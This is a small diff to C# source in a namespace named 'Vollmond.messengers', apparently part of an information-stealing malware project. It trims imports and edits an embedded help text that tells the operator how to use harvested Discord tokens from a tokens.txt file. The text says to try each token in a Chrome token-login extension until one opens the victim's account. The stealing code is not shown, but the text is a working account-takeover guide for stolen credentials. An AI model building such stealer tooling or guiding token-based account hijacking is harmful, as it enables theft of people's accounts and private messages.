@@ -1,9 +1,5 @@
 ﻿using Newtonsoft.Json;
-using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
@@ -83,7 +79,7 @@ namespace Vollmond.messengers
                 """
                 ## How to use Discord tokens
 
-                __In the tokens.txt file, you may see entries like: ANak2n_n aj197hb - these are tokens. And "C:\Users...Does not exist" - is an entry you don't need.__
+                __In the tokens.txt file, you may see entries like: ANak2n_naj197hb - these are tokens.__
 
                 1. **[Download this extension for Chrome](https://chromewebstore.google.com/detail/discord-token-login/pdmpkpjlmnndlfdllmnekbmgjikhghjg)**
                 1. **In the extension, enter all the tokens one by one until you log in to your account (one token is valid; the other tokens are invalid)**
